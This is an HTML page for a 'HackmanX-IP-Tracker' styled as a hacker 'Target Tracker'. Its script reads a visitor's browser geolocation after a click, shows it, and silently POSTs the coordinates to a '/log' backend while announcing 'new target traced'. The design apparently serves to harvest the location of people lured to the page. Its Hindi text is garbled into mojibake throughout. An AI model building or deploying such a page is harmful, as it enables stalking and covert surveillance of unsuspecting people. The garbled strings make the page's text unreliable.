<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <title>HackmanX-IP-Tracker</title>
  <link rel="stylesheet" href="/static/style.css">
  <style>
    body {
      background-color: black;
      color: lime;
      font-family: monospace;
      text-align: center;
      padding-top: 50px;
    }
    #location, #timestamp {
      margin-top: 20px;
      font-size: 1.2em;
    }
    #map-link {
      margin-top: 10px;
      display: block;
      color: cyan;
    }
    #divider {
      margin-top: 20px;
      color: gray;
    }
    #loader {
      color: red;
      animation: blink 1s infinite;
    }
    @keyframes blink {
      0% {opacity: 1;}
      50% {opacity: 0;}
      100% {opacity: 1;}
    }
  </style>
</head>
<body>
  <h1>ЁЯОп Target Tracker</h1>
  <button onclick="getLocation()">ЁЯФН Track</button>

  <p id="loader">ЁЯОп рд▓рдХреНрд╖реНрдп рдЦреЛрдЬрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ...</p>
  <p id="location"></p>
  <p id="timestamp"></p>
  <a id="map-link" href="#" target="_blank"></a>
  <p id="divider">тФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБ</p>

  <script>
    function getLocation() {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const now = new Date().toLocaleString('hi-IN');

        // Hide loader
        document.getElementById("loader").style.display = "none";

        // Show location and timestamp
        document.getElementById("location").innerText = "ЁЯУН рдЖрдкрдХрд╛ рд╕реНрдерд╛рди: " + lat + ", " + lon;
        document.getElementById("timestamp").innerText = "ЁЯХТ рд╕рдордп: " + now;

        document.getElementById("map-link").innerText = "ЁЯЧ║я╕П Google Map рдкрд░ рджреЗрдЦреЗрдВ";
        document.getElementById("map-link").href = `https://www.google.com/maps?q=${lat},${lon}`;

        // Send to backend
        fetch('/log', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ lat: lat, lon: lon })
        });

        // Play sound
        let audio = new Audio('/static/sound/target_found.mp3');
        audio.play();

        // Hindi narration
        let speech = new SpeechSynthesisUtterance("рдирдпрд╛ рд▓рдХреНрд╖реНрдп рдЯреНрд░реЗрд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛");
        speech.lang = "hi-IN";
        window.speechSynthesis.speak(speech);
      },
      err => {
        document.getElementById("loader").innerText = "тЭМ рд╕реНрдерд╛рди рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рд╕рдХрд╛ред рдХреГрдкрдпрд╛ рдЕрдиреБрдорддрд┐ рджреЗрдВред";
      });
    }
  </script>
</body>
</html>
